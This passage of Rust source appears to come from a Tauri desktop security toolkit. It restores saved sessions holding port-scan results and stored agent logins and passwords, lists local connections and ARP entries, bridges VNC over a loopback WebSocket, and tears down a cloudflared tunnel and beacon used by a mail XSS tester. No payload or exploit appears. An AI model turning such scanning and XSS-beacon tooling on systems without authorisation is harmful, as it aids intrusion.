                    Err(_) => {
                        let mid: Result<Vec<PortRow>, rusqlite::Error> = (|| {
                            let mut stmt = conn.prepare("SELECT result_id, port, protocol, service FROM scan_result_ports ORDER BY id")?;
                            let rows = stmt.query_map([], |row| Ok((row.get(0)?, row.get(1)?, row.get(2)?, "open".to_string(), row.get(3)?, "-".to_string())))?
                                .collect();
                            rows
                        })();
                        match mid {
                            Ok(rows) => rows,
                            Err(_) => {
                                let mut stmt = conn.prepare("SELECT result_id, port FROM scan_result_ports ORDER BY id")
                                    .map_err(|e| format!("Failed to prepare scan_result_ports read (legacy): {e}"))?;
                                let rows = stmt.query_map([], |row| Ok((row.get::<_, i64>(0)?, row.get::<_, i64>(1)?, "TCP".to_string(), "open".to_string(), String::new(), "-".to_string())))
                                    .map_err(|e| format!("Failed to query scan_result_ports (legacy): {e}"))?
                                    .collect::<Result<Vec<_>, _>>()
                                    .map_err(|e| format!("Failed to read scan_result_ports row (legacy): {e}"))?;
                                rows
                            }
                        }
                    }
                }
            }
        };
        for (result_id, port, protocol, status, service, ping) in port_rows {
            if let Some(&idx) = scan_result_index.get(&result_id) {
                scan_results[idx].ports.push(ScanPortEntry { port, protocol, status, service, ping });
            }
        }
    }

    let scan_progress = {
        let mut stmt = conn
            .prepare("SELECT state, processed, total, found FROM scan_progress WHERE id = 1")
            .map_err(|e| format!("Failed to prepare scan_progress read: {e}"))?;
        let mut rows = stmt.query([]).map_err(|e| format!("Failed to query scan_progress: {e}"))?;
        if let Some(row) = rows.next().map_err(|e| format!("Failed to read scan_progress row: {e}"))? {
            ScanProgressData {
                state: row.get(0).map_err(|e| format!("Failed to read scan_progress.state: {e}"))?,
                processed: row.get(1).map_err(|e| format!("Failed to read scan_progress.processed: {e}"))?,
                total: row.get(2).map_err(|e| format!("Failed to read scan_progress.total: {e}"))?,
                found: row.get(3).map_err(|e| format!("Failed to read scan_progress.found: {e}"))?,
            }
        } else {
            ScanProgressData { state: String::new(), processed: 0, total: 0, found: 0 }
        }
    };

    let ip_library_entries = {
        let mut stmt = conn
            .prepare("SELECT country_code, cidr FROM ip_library_entries ORDER BY id")
            .map_err(|e| format!("Failed to prepare ip_library_entries read: {e}"))?;
        let rows = stmt
            .query_map([], |row| Ok(IpLibraryEntry { country_code: row.get(0)?, cidr: row.get(1)? }))
            .map_err(|e| format!("Failed to query ip_library_entries: {e}"))?;
        let mut entries = Vec::new();
        for row in rows {
            entries.push(row.map_err(|e| format!("Failed to read ip_library_entries row: {e}"))?);
        }
        entries
    };

    let ip_library_updated_at = {
        let mut stmt = conn
            .prepare("SELECT updated_at FROM ip_library_meta WHERE id = 1")
            .map_err(|e| format!("Failed to prepare ip_library_meta read: {e}"))?;
        let mut rows = stmt.query([]).map_err(|e| format!("Failed to query ip_library_meta: {e}"))?;
        if let Some(row) = rows.next().map_err(|e| format!("Failed to read ip_library_meta row: {e}"))? {
            row.get(0).map_err(|e| format!("Failed to read ip_library_meta.updated_at: {e}"))?
        } else {
            String::new()
        }
    };

    let (presets_items, default_preset_id) = {
        let mut stmt = conn
            .prepare("SELECT id, emoji, name, ports, is_default FROM port_presets ORDER BY rowid")
            .map_err(|e| format!("Failed to prepare port_presets read: {e}"))?;
        let rows = stmt
            .query_map([], |row| {
                Ok((
                    PresetItem { id: row.get(0)?, emoji: row.get(1)?, name: row.get(2)?, ports: row.get(3)? },
                    row.get::<_, bool>(4)?,
                ))
            })
            .map_err(|e| format!("Failed to query port_presets: {e}"))?;
        let mut items = Vec::new();
        let mut default_id = String::new();
        for row in rows {
            let (item, is_default) = row.map_err(|e| format!("Failed to read port_presets row: {e}"))?;
            if is_default {
                default_id = item.id.clone();
            }
            items.push(item);
        }
        (items, default_id)
    };

    let scan_defaults = {
        let mut stmt = conn
            .prepare("SELECT timeout_ms, concurrency FROM scan_defaults WHERE id = 1")
            .map_err(|e| format!("Failed to prepare scan_defaults read: {e}"))?;
        let mut rows = stmt.query([]).map_err(|e| format!("Failed to query scan_defaults: {e}"))?;
        if let Some(row) = rows.next().map_err(|e| format!("Failed to read scan_defaults row: {e}"))? {
            ScanDefaultsData {
                timeout_ms: row.get(0).map_err(|e| format!("Failed to read scan_defaults.timeout_ms: {e}"))?,
                concurrency: row.get(1).map_err(|e| format!("Failed to read scan_defaults.concurrency: {e}"))?,
            }
        } else {
            ScanDefaultsData { timeout_ms: 0, concurrency: 0 }
        }
    };

    let agent_profiles = {
        let mut stmt = conn
            .prepare("SELECT id, name, nickname, email, login, password, note FROM agent_profiles ORDER BY rowid")
            .map_err(|e| format!("Failed to prepare agent_profiles read: {e}"))?;
        let rows = stmt
            .query_map([], |row| {
                Ok(AgentProfileRow {
                    id: row.get(0)?,
                    name: row.get(1)?,
                    nickname: row.get(2)?,
                    email: row.get(3)?,
                    login: row.get(4)?,
                    password: row.get(5)?,
                    note: row.get(6)?,
                })
            })
            .map_err(|e| format!("Failed to query agent_profiles: {e}"))?;
        let mut items = Vec::new();
        for row in rows {
            items.push(row.map_err(|e| format!("Failed to read agent_profiles row: {e}"))?);
        }
        items
    };

    let agent_profile_attachments = {
        let mut stmt = conn
            .prepare("SELECT id, profile_id, filename, mime_type, role, data FROM agent_profile_attachments ORDER BY rowid")
            .map_err(|e| format!("Failed to prepare agent_profile_attachments read: {e}"))?;
        let rows = stmt
            .query_map([], |row| {
                let bytes: Vec<u8> = row.get(5)?;
                Ok(AgentProfileAttachmentRow {
                    id: row.get(0)?,
                    profile_id: row.get(1)?,
                    filename: row.get(2)?,
                    mime_type: row.get(3)?,
                    role: row.get(4)?,
                    data_base64: BASE64_STANDARD.encode(bytes),
                })
            })
            .map_err(|e| format!("Failed to query agent_profile_attachments: {e}"))?;
        let mut items = Vec::new();
        for row in rows {
            items.push(row.map_err(|e| format!("Failed to read agent_profile_attachments row: {e}"))?);
        }
        items
    };

    let agent_profile_services = {
        let mut stmt = conn
            .prepare("SELECT id, profile_id, name FROM agent_profile_services ORDER BY rowid")
            .map_err(|e| format!("Failed to prepare agent_profile_services read: {e}"))?;
        let rows = stmt
            .query_map([], |row| {
                Ok(AgentProfileServiceRow {
                    id: row.get(0)?,
                    profile_id: row.get(1)?,
                    name: row.get(2)?,
                })
            })
            .map_err(|e| format!("Failed to query agent_profile_services: {e}"))?;
        let mut items = Vec::new();
        for row in rows {
            items.push(row.map_err(|e| format!("Failed to read agent_profile_services row: {e}"))?);
        }
        items
    };

    let agent_profile_service_fields = {
        let mut stmt = conn
            .prepare("SELECT id, service_id, label, type, value FROM agent_profile_service_fields ORDER BY rowid")
            .map_err(|e| format!("Failed to prepare agent_profile_service_fields read: {e}"))?;
        let rows = stmt
            .query_map([], |row| {
                Ok(AgentProfileServiceFieldRow {
                    id: row.get(0)?,
                    service_id: row.get(1)?,
                    label: row.get(2)?,
                    field_type: row.get(3)?,
                    value: row.get(4)?,
                })
            })
            .map_err(|e| format!("Failed to query agent_profile_service_fields: {e}"))?;
        let mut items = Vec::new();
        for row in rows {
            items.push(row.map_err(|e| format!("Failed to read agent_profile_service_fields row: {e}"))?);
        }
        items
    };

    let layout = {
        let mut stmt = conn
            .prepare("SELECT section, tool, is_active FROM session_layout_tabs ORDER BY id")
            .map_err(|e| format!("Failed to prepare session_layout_tabs read: {e}"))?;
        let rows = stmt
            .query_map([], |row| {
                Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, bool>(2)?))
            })
            .map_err(|e| format!("Failed to query session_layout_tabs: {e}"))?;

        let mut center = SectionLayout { open: Vec::new(), active: None };
        let mut left = SectionLayout { open: Vec::new(), active: None };
        let mut right = SectionLayout { open: Vec::new(), active: None };

        for row in rows {
            let (section, tool, is_active) = row.map_err(|e| format!("Failed to read session_layout_tabs row: {e}"))?;
            let target = match section.as_str() {
                "center" => &mut center,
                "left" => &mut left,
                "right" => &mut right,
                _ => continue,
            };
            target.open.push(tool.clone());
            if is_active {
                target.active = Some(tool);
            }
        }

        LayoutData { center, left, right }
    };

    // Older session files may be missing app_version (added for the session
    // versioning feature) - same newest-first-then-fallback discipline as
    // scan_results' own city/country_code/lat/lon columns above.
    let meta = {
        let newest: Result<(String, String), rusqlite::Error> = conn.query_row(
            "SELECT saved_at, app_version FROM session_meta WHERE id = 1",
            [],
            |row| Ok((row.get(0)?, row.get(1)?)),
        );
        match newest {
            Ok((saved_at, app_version)) => SessionMetaData { saved_at, app_version },
            Err(_) => {
                let saved_at: String = conn.query_row(
                    "SELECT saved_at FROM session_meta WHERE id = 1",
                    [],
                    |row| row.get(0),
                ).unwrap_or_default();
                SessionMetaData { saved_at, app_version: String::new() }
            }
        }
    };

    // session_extensions is a brand new table, and read_session_data (unlike
    // write_session_data) opens a plain Connection rather than going through
    // open_session_sqlite_conn's migrations - so a session file saved before
    // this feature genuinely has no such table yet, and the query below
    // errors. Same discipline as every other newest-shape-then-fallback read
    // in this function: treat a query failure as "no extensions recorded".
    let extensions: Vec<SessionExtensionRow> = (|| -> Result<Vec<SessionExtensionRow>, rusqlite::Error> {
        let mut stmt = conn.prepare("SELECT id, name, version, manifest_json FROM session_extensions ORDER BY rowid")?;
        let rows = stmt.query_map([], |row| {
            Ok(SessionExtensionRow {
                id: row.get(0)?,
                name: row.get(1)?,
                version: row.get(2)?,
                manifest_json: row.get(3)?,
            })
        })?.collect();
        rows
    })().unwrap_or_default();

    // Same "brand new table, older session files don't have it" fallback
    // as session_extensions above.
    let https_audit_history: Vec<HttpsAuditHistoryRow> = (|| -> Result<Vec<HttpsAuditHistoryRow>, rusqlite::Error> {
        let mut stmt = conn.prepare("SELECT id, audited_at, requested_url, final_url, grade, result_json FROM https_audit_history ORDER BY audited_at DESC")?;
        let rows = stmt.query_map([], |row| {
            Ok(HttpsAuditHistoryRow {
                id: row.get(0)?,
                audited_at: row.get(1)?,
                requested_url: row.get(2)?,
                final_url: row.get(3)?,
                grade: row.get(4)?,
                result_json: row.get(5)?,
            })
        })?.collect();
        rows
    })().unwrap_or_default();

    // Same "brand new table, older session files don't have it" fallback
    // as session_extensions/https_audit_history above.
    let (domain_verification_file_name, domain_verification_key, domain_verification_generated_at): (String, String, i64) =
        conn.query_row("SELECT file_name, key, generated_at FROM domain_verification_key WHERE id = 1", [], |row| {
            Ok((row.get(0)?, row.get(1)?, row.get(2)?))
        }).unwrap_or_default();
    let domain_verification_domains: Vec<VerifiedDomainRow> = (|| -> Result<Vec<VerifiedDomainRow>, rusqlite::Error> {
        let mut stmt = conn.prepare("SELECT domain, verified_at FROM domain_verification_domains ORDER BY verified_at ASC")?;
        let rows = stmt.query_map([], |row| {
            Ok(VerifiedDomainRow { domain: row.get(0)?, verified_at: row.get(1)? })
        })?.collect();
        rows
    })().unwrap_or_default();

    let mail_verification_emails: Vec<VerifiedEmailRow> = (|| -> Result<Vec<VerifiedEmailRow>, rusqlite::Error> {
        let mut stmt = conn.prepare("SELECT email, verified_at FROM mail_verification_emails ORDER BY verified_at ASC")?;
        let rows = stmt.query_map([], |row| {
            Ok(VerifiedEmailRow { email: row.get(0)?, verified_at: row.get(1)? })
        })?.collect();
        rows
    })().unwrap_or_default();

    // Same "brand new table, older session files don't have it" fallback
    // as domain_verification/mail_verification above.
    let memory_notepad_content: String = conn
        .query_row("SELECT content FROM memory_notepad WHERE id = 1", [], |row| row.get(0))
        .unwrap_or_default();
    let ip_extractor_input_text: String = conn
        .query_row("SELECT input_text FROM ip_extractor_state WHERE id = 1", [], |row| row.get(0))
        .unwrap_or_default();
    let ip_extractor_entries: Vec<String> = (|| -> Result<Vec<String>, rusqlite::Error> {
        let mut stmt = conn.prepare("SELECT ip FROM ip_extractor_entries ORDER BY id ASC")?;
        let rows = stmt.query_map([], |row| row.get(0))?.collect();
        rows
    })().unwrap_or_default();
    let terminal_history_entries: Vec<String> = (|| -> Result<Vec<String>, rusqlite::Error> {
        let mut stmt = conn.prepare("SELECT command FROM terminal_command_history ORDER BY id ASC")?;
        let rows = stmt.query_map([], |row| row.get(0))?.collect();
        rows
    })().unwrap_or_default();

    Ok(SessionData {
        scan_results,
        scan_progress,
        ip_library: IpLibraryData { entries: ip_library_entries, updated_at: ip_library_updated_at },
        presets: PresetsData { default_preset_id, presets: presets_items },
        scan_defaults,
        agent_profiles: AgentProfilesData {
            profiles: agent_profiles,
            attachments: agent_profile_attachments,
            services: agent_profile_services,
            fields: agent_profile_service_fields,
        },
        layout,
        meta,
        extensions,
        https_audit_history,
        domain_verification: DomainVerificationData {
            file_name: domain_verification_file_name,
            key: domain_verification_key,
            generated_at: domain_verification_generated_at,
            verified_domains: domain_verification_domains,
        },
        mail_verification: MailVerificationData {
            verified_emails: mail_verification_emails,
        },
        memory_notepad: MemoryNotepadData { content: memory_notepad_content },
        ip_extractor: IpExtractorData { input_text: ip_extractor_input_text, entries: ip_extractor_entries },
        terminal_history: TerminalHistoryData { entries: terminal_history_entries },
    })
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct SessionFileResult {
    path: String,
    data: SessionData,
}

#[tauri::command]
fn session_install_dir() -> Result<String, String> {
    let exe = std::env::current_exe().map_err(|e| format!("Failed to resolve exe path: {e}"))?;
    let dir = exe
        .parent()
        .ok_or_else(|| "Failed to resolve install directory".to_string())?;
    Ok(dir.to_string_lossy().to_string())
}

#[tauri::command]
fn save_session_dialog(default_dir: String, default_filename: String, data: SessionData) -> Result<String, String> {
    let mut dialog = rfd::FileDialog::new()
        .set_title("Save Session")
        .set_file_name(&default_filename)
        .add_filter("SQLite Session", &["sqlite3"]);

    if !default_dir.trim().is_empty() {
        dialog = dialog.set_directory(&default_dir);
    }

    let path = dialog.save_file().ok_or_else(|| "cancelled".to_string())?;
    write_session_data(&path, &data)?;
    Ok(path.to_string_lossy().to_string())
}

// Generic plain-text file save via a native dialog - HTTPS Auditor's CSV
// export uses this. A browser's own <a download> click (the www build's
// fallback, see https-auditor-runtime.js's isDesktop() branch) is a
// silent no-op in Tauri's WebView2 - session save/load already worked
// around the same gap with save_session_dialog above, this just
// generalizes that to arbitrary text content instead of one binary
// SessionData shape.
#[tauri::command]
fn save_text_file_dialog(
    app: AppHandle,
    default_filename: String,
    content: String,
    filter_name: String,
    filter_ext: String,
    default_dir: Option<String>,
) -> Result<String, String> {
    let mut dialog = rfd::FileDialog::new()
        .set_title("Save")
        .set_file_name(&default_filename)
        .add_filter(&filter_name, &[filter_ext.as_str()]);

    // Explicit default_dir wins (domain verification always passes the
    // Desktop path so the file lands somewhere the user will actually
    // notice it, ready to upload); falls back to the OS's real Desktop
    // folder when the caller doesn't care (CSV export today) rather than
    // rfd's own undefined default, which otherwise tends to reopen
    // wherever the last unrelated file dialog left off.
    let resolved_dir = default_dir
        .filter(|s| !s.trim().is_empty())
        .or_else(|| app.path().desktop_dir().ok().map(|p| p.to_string_lossy().to_string()));
    if let Some(dir) = resolved_dir {
        dialog = dialog.set_directory(dir);
    }

    let path = dialog.save_file().ok_or_else(|| "cancelled".to_string())?;
    std::fs::write(&path, content).map_err(|e| e.to_string())?;
    Ok(path.to_string_lossy().to_string())
}

#[tauri::command]
fn open_session_dialog(default_dir: String) -> Result<SessionFileResult, String> {
    let mut dialog = rfd::FileDialog::new()
        .set_title("Load Session")
        .add_filter("SQLite Session", &["sqlite3"]);

    if !default_dir.trim().is_empty() {
        dialog = dialog.set_directory(&default_dir);
    }

    let path = dialog.pick_file().ok_or_else(|| "cancelled".to_string())?;
    let data = read_session_data(&path)?;
    Ok(SessionFileResult {
        path: path.to_string_lossy().to_string(),
        data,
    })
}

#[tauri::command]
fn write_session_file(path: String, data: SessionData) -> Result<(), String> {
    write_session_data(Path::new(&path), &data)
}

#[tauri::command]
fn read_session_file(path: String) -> Result<SessionData, String> {
    read_session_data(Path::new(&path))
}

#[tauri::command]
fn window_minimize(window: WebviewWindow) -> Result<(), String> {
    window.minimize().map_err(|e| e.to_string())
}

#[tauri::command]
fn window_toggle_maximize(window: WebviewWindow) -> Result<(), String> {
    if window.is_maximized().map_err(|e| e.to_string())? {
        return window.unmaximize().map_err(|e| e.to_string());
    }

    window.maximize().map_err(|e| e.to_string())?;

    // Frameless (decorations:false) windows don't get Windows' normal
    // maximize-to-work-area clipping (that relies on WS_CAPTION/WS_THICKFRAME
    // styles this window lacks), so maximize() alone sizes the window to the
    // full physical monitor - covering the taskbar with unpainted black
    // backbuffer instead of leaving it visible. Correct the bounds to the
    // monitor's actual work area afterward; still calling maximize() first
    // (rather than only set_size/set_position) keeps the OS-level maximized
    // flag correct so unmaximize()/is_maximized() keep working normally.
    #[cfg(target_os = "windows")]
    {
        if let Ok(Some(monitor)) = window.current_monitor() {
            let work_area = monitor.work_area();
            window.set_position(work_area.position).map_err(|e| e.to_string())?;
            window.set_size(work_area.size).map_err(|e| e.to_string())?;
        }
    }

    Ok(())
}

#[tauri::command]
fn window_toggle_fullscreen(window: WebviewWindow) -> Result<(), String> {
    let is_fullscreen = window.is_fullscreen().map_err(|e| e.to_string())?;
    if is_fullscreen {
        return window.set_fullscreen(false).map_err(|e| e.to_string());
    }

    #[cfg(target_os = "windows")]
    {
        // On Windows, entering fullscreen directly from maximized frameless windows
        // can leave a stale bottom strip. Unmaximize first so the OS recalculates bounds.
        if window.is_maximized().map_err(|e| e.to_string())? {
            window.unmaximize().map_err(|e| e.to_string())?;
            std::thread::sleep(Duration::from_millis(35));
        }
    }

    window.set_fullscreen(true).map_err(|e| e.to_string())
}

// General settings -> "Remember window state": queried by the frontend
// right after a maximize/fullscreen toggle so it can persist the resulting
// mode (see menu-runtime.js). Read-only - does not itself change the window.
#[tauri::command]
fn window_get_state(window: WebviewWindow) -> Result<String, String> {
    if window.is_fullscreen().map_err(|e| e.to_string())? {
        return Ok("fullscreen".to_string());
    }
    if window.is_maximized().map_err(|e| e.to_string())? {
        return Ok("maximized".to_string());
    }
    Ok("normal".to_string())
}

#[tauri::command]
fn window_start_dragging(window: WebviewWindow) -> Result<(), String> {
    window.start_dragging().map_err(|e| e.to_string())
}

// Kills anything this app spawned that the OS won't clean up on its own
// just because our own process exits - a running cloudflared tunnel
// (std::process::Child, a genuinely separate OS process, no "die with
// parent" behavior on Windows unless something explicitly kills it) and
// the browser-network proxy's accept-loop task. Called from BOTH
// window_close() below (the custom "X" button's own command - this is
// the path almost every real close goes through, and it calls
// app.exit(0) directly, which does NOT fire WindowEvent::CloseRequested)
// and the on_window_event hook further down (Alt+F4, the taskbar's
// "Close window" - anything that goes through the OS's normal close
// flow instead of this command). Left running, a forgotten tunnel keeps
// a real public *.trycloudflare.com URL forwarding into this machine
// indefinitely. Can't do anything about a hard kill (Task Manager "End
// Task", a crash) - no app-level hook runs at all for those, on any OS.
fn cleanup_background_processes(app: &AppHandle) {
    if let Some(state) = app.try_state::<Arc<MailXssTesterState>>() {
        if let Some(mut child) = state.tunnel_child.lock().unwrap().take() {
            let _ = child.kill();
        }
        if let Some(handle) = state.beacon_task.lock().unwrap().take() {
            handle.abort();
        }
    }
    if let Some(state) = app.try_state::<Arc<BrowserProxyState>>() {
        if let Some(handle) = state.server_task.lock().unwrap().take() {
            handle.abort();
        }
    }
}

#[tauri::command]
fn window_close(app: AppHandle) -> Result<(), String> {
    cleanup_background_processes(&app);
    // Was window.close() on the main WebviewWindow, but that left the
    // embedded Browser's child webview (Window::add_child) as an orphaned
    // ghost frame - Windows' own "app not responding" ghost-window overlay
    // showed up around it, confirming the app was genuinely hanging during
    // an attempted graceful close, not just failing to tear the child down.
    // Tried closing the child explicitly first (several orderings/thread
    // hops, see git history) without success - hard-exiting the whole
    // process sidesteps whatever that deadlock actually was: the OS
    // guarantees every window/webview belonging to the process, orphaned
    // children included, goes away together, with nothing left to hang.
    app.exit(0);
    Ok(())
}

fn ip_to_u32(ip: &str) -> Result<u32, String> {
    match IpAddr::from_str(ip).map_err(|e| e.to_string())? {
        IpAddr::V4(v4) => Ok(u32::from(v4)),
        IpAddr::V6(_)  => Err("IPv6 not supported".into()),
    }
}

fn u32_to_ip(n: u32) -> String {
    let [a, b, c, d] = n.to_be_bytes();
    format!("{}.{}.{}.{}", a, b, c, d)
}

// ─── Network Monitor (local connections + ARP table, no admin) ────────────────────────

#[derive(Debug, Clone, Serialize)]
struct ConnectionRow {
    protocol: String,
    local_addr: String,
    local_port: u16,
    remote_addr: String,
    remote_port: u16,
    state: String,
    pid: u32,
    process_name: String,
}

#[derive(Debug, Clone, Serialize)]
struct ArpEntryRow {
    ip: String,
    mac: String,
    interface: String,
}

// GetIpNetTable2's fixed-size Vec<u8> backing buffer would only guarantee
// 1-byte alignment, but MIB_TCPTABLE_OWNER_PID/MIB_UDPTABLE_OWNER_PID need
// 4-byte alignment - back the buffer with u64 words instead so the cast to
// a typed pointer below is never unaligned.
fn alloc_word_buffer(min_bytes: usize) -> Vec<u64> {
    vec![0u64; min_bytes / 8 + 2]
}

// Shared "call with a null buffer to learn the required size, allocate,
// call again, grow-and-retry on ERROR_INSUFFICIENT_BUFFER" pattern behind
// both GetExtendedTcpTable and GetExtendedUdpTable in list_connections()
// below - the two loops used to be hand-copied and had already started to
// drift from each other (a common source of off-by-one/wrong-error-code
// bugs in this pattern).
unsafe fn query_growable_table<F>(label: &str, mut call: F) -> Result<Vec<u64>, String>
where
    F: FnMut(Option<*mut std::ffi::c_void>, &mut u32) -> u32,
{
    let mut size: u32 = 0;
    let _ = call(None, &mut size);
    let mut buf = alloc_word_buffer(size as usize);
    loop {
        size = (buf.len() * 8) as u32;
        let ret = call(Some(buf.as_mut_ptr() as *mut std::ffi::c_void), &mut size);
        if ret == 0 {
            break;
        } else if ret == ERROR_INSUFFICIENT_BUFFER.0 {
            buf = alloc_word_buffer(size as usize);
        } else {
            return Err(format!("{} failed with code {}", label, ret));
        }
    }
    Ok(buf)
}

fn tcp_state_name(state: u32) -> &'static str {
    let state = state as i32;
    if state == MIB_TCP_STATE_CLOSED.0 { "CLOSED" }
    else if state == MIB_TCP_STATE_LISTEN.0 { "LISTEN" }
    else if state == MIB_TCP_STATE_SYN_SENT.0 { "SYN_SENT" }
    else if state == MIB_TCP_STATE_SYN_RCVD.0 { "SYN_RCVD" }
    else if state == MIB_TCP_STATE_ESTAB.0 { "ESTABLISHED" }
    else if state == MIB_TCP_STATE_FIN_WAIT1.0 { "FIN_WAIT1" }
    else if state == MIB_TCP_STATE_FIN_WAIT2.0 { "FIN_WAIT2" }
    else if state == MIB_TCP_STATE_CLOSE_WAIT.0 { "CLOSE_WAIT" }
    else if state == MIB_TCP_STATE_CLOSING.0 { "CLOSING" }
    else if state == MIB_TCP_STATE_LAST_ACK.0 { "LAST_ACK" }
    else if state == MIB_TCP_STATE_TIME_WAIT.0 { "TIME_WAIT" }
    else if state == MIB_TCP_STATE_DELETE_TCB.0 { "DELETE_TCB" }
    else { "UNKNOWN" }
}

// dwLocalAddr/dwLocalPort are DWORDs whose raw bytes hold the address/port
// in network byte order - to_ne_bytes()/from_be() recover the correct
// values because Windows only ever runs little-endian.
fn ipv4_from_dword(addr: u32) -> Ipv4Addr {
    Ipv4Addr::from(addr.to_ne_bytes())
}

fn port_from_dword(port: u32) -> u16 {
    u16::from_be(port as u16)
}

fn process_name_for_pid(pid: u32) -> Option<String> {
    unsafe {
        let handle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid).ok()?;
        let mut buf = [0u16; 260];
        let mut size = buf.len() as u32;
        let result = QueryFullProcessImageNameW(
            handle,
            PROCESS_NAME_WIN32,
            windows::core::PWSTR(buf.as_mut_ptr()),
            &mut size,
        );
        let _ = CloseHandle(handle);
        result.ok()?;
        let full_path = String::from_utf16_lossy(&buf[..size as usize]);
        Path::new(&full_path)
            .file_name()
            .map(|n| n.to_string_lossy().to_string())
    }
}

#[tauri::command]
fn list_connections() -> Result<Vec<ConnectionRow>, String> {
    let mut rows: Vec<ConnectionRow> = Vec::new();
    let mut pid_names: HashMap<u32, String> = HashMap::new();
    let mut resolve_name = |pid: u32| -> String {
        if pid == 0 {
            return "System Idle Process".to_string();
        }
        if let Some(name) = pid_names.get(&pid) {
            return name.clone();
        }
        let name = process_name_for_pid(pid).unwrap_or_else(|| "-".to_string());
        pid_names.insert(pid, name.clone());
        name
    };

    unsafe {
        let buf = query_growable_table("GetExtendedTcpTable", |ptr, size| {
            GetExtendedTcpTable(ptr, size, false, AF_INET.0 as u32, TCP_TABLE_OWNER_PID_ALL, 0)
        })?;
        let table = &*(buf.as_ptr() as *const MIB_TCPTABLE_OWNER_PID);
        let entries = std::slice::from_raw_parts(table.table.as_ptr(), table.dwNumEntries as usize);
        for row in entries {
            let pid = row.dwOwningPid;
            rows.push(ConnectionRow {
                protocol: "TCP".to_string(),
                local_addr: ipv4_from_dword(row.dwLocalAddr).to_string(),
                local_port: port_from_dword(row.dwLocalPort),
                remote_addr: ipv4_from_dword(row.dwRemoteAddr).to_string(),
                remote_port: port_from_dword(row.dwRemotePort),
                state: tcp_state_name(row.dwState).to_string(),
                pid,
                process_name: resolve_name(pid),
            });
        }

        let buf = query_growable_table("GetExtendedUdpTable", |ptr, size| {
            GetExtendedUdpTable(ptr, size, false, AF_INET.0 as u32, UDP_TABLE_OWNER_PID, 0)
        })?;
        let table = &*(buf.as_ptr() as *const MIB_UDPTABLE_OWNER_PID);
        let entries = std::slice::from_raw_parts(table.table.as_ptr(), table.dwNumEntries as usize);
        for row in entries {
            let pid = row.dwOwningPid;
            rows.push(ConnectionRow {
                protocol: "UDP".to_string(),
                local_addr: ipv4_from_dword(row.dwLocalAddr).to_string(),
                local_port: port_from_dword(row.dwLocalPort),
                remote_addr: String::new(),
                remote_port: 0,
                state: String::new(),
                pid,
                process_name: resolve_name(pid),
            });
        }
    }

    Ok(rows)
}

#[tauri::command]
fn list_arp_entries() -> Result<Vec<ArpEntryRow>, String> {
    let mut table_ptr: *mut MIB_IPNET_TABLE2 = std::ptr::null_mut();
    unsafe {
        let err = GetIpNetTable2(AF_INET, &mut table_ptr);
        if err.0 != 0 {
            return Err(format!("GetIpNetTable2 failed with code {}", err.0));
        }
        let table = &*table_ptr;
        let entries = std::slice::from_raw_parts(table.Table.as_ptr(), table.NumEntries as usize);
        let mut rows = Vec::with_capacity(entries.len());
        for row in entries {
            // Skip incomplete/unresolved neighbor entries (no MAC learned yet)
            // and anything that isn't a plain IPv4 neighbor.
            if row.PhysicalAddressLength == 0 || row.Address.si_family != AF_INET {
                continue;
            }
            let ip = ipv4_from_dword(row.Address.Ipv4.sin_addr.S_un.S_addr);
            let mac_len = (row.PhysicalAddressLength as usize).min(row.PhysicalAddress.len());
            let mac = row.PhysicalAddress[..mac_len]
                .iter()
                .map(|b| format!("{:02X}", b))
                .collect::<Vec<_>>()
                .join(":");
            rows.push(ArpEntryRow {
                ip: ip.to_string(),
                mac,
                interface: row.InterfaceIndex.to_string(),
            });
        }
        FreeMibTable(table_ptr as *const _);
        Ok(rows)
    }
}

// ─── Main ────────────────────────────────────────────────────────────────────────────

// Topology's VNC desktop preview: browsers can't open raw TCP sockets, so
// noVNC (browser side) speaks WebSocket to this bridge instead, and the
// bridge is the one that actually opens a plain TCP connection to the
// target node's real VNC server and pipes bytes both directions - same
// "dumb pipe, no VNC protocol parsing" shape as a typical websockify
// bridge. Loopback-only (127.0.0.1) - nothing outside this machine's own
// webview is meant to reach it. Unlike a single fixed target, Topology can
// have many nodes, so the target host:port travels per-connection as a
// query string on the WS upgrade request (?host=...&port=...) rather than
// being fixed at bridge-startup time.
const VNC_BRIDGE_PORT: u16 = 17900;

fn percent_decode(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 3 <= bytes.len() {
            if let Ok(byte) = u8::from_str_radix(&input[i + 1..i + 3], 16) {
                out.push(byte);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn parse_vnc_bridge_target(query: &str) -> Option<(String, u16)> {
    let mut host: Option<String> = None;
    let mut port: Option<u16> = None;
    for pair in query.split('&') {
        let mut it = pair.splitn(2, '=');
        let key = it.next().unwrap_or("");
        let value = percent_decode(it.next().unwrap_or(""));
        if key == "host" {
            host = Some(value);
        } else if key == "port" {
            port = value.parse::<u16>().ok();
        }
    }
    match (host, port) {
        (Some(h), Some(p)) if !h.is_empty() => Some((h, p)),
        _ => None,
    }
}

async fn handle_vnc_bridge_connection(stream: TcpStream) {
    let mut target: Option<(String, u16)> = None;
    let callback = |req: &tokio_tungstenite::tungstenite::handshake::server::Request,
                     response: tokio_tungstenite::tungstenite::handshake::server::Response|
     -> Result<
        tokio_tungstenite::tungstenite::handshake::server::Response,
        tokio_tungstenite::tungstenite::handshake::server::ErrorResponse,
    > {
        target = parse_vnc_bridge_target(req.uri().query().unwrap_or(""));
        Ok(response)
    };

    let ws_stream = match tokio_tungstenite::accept_hdr_async(stream, callback).await {
        Ok(s) => s,
        Err(_) => return,
    };

    let (host, port) = match target {
        Some(t) => t,
        None => return,
    };

    let tcp = match TcpStream::connect((host.as_str(), port)).await {
        Ok(t) => t,
        Err(_) => return,
    };
    let (mut tcp_read, mut tcp_write) = tcp.into_split();
    let (mut ws_write, mut ws_read) = ws_stream.split();

    let ws_to_tcp = async {
        while let Some(msg) = ws_read.next().await {
            let msg = match msg {
                Ok(m) => m,
                Err(_) => break,
            };
            match msg {
                Message::Binary(data) => {
                    if tcp_write.write_all(&data).await.is_err() {
                        break;
                    }
                }
                Message::Close(_) => break,
                _ => {}
            }
        }
    };

    let tcp_to_ws = async {
        let mut buf = [0u8; 8192];
        loop {
            let n = match tcp_read.read(&mut buf).await {
                Ok(0) => break,
                Ok(n) => n,
                Err(_) => break,
            };
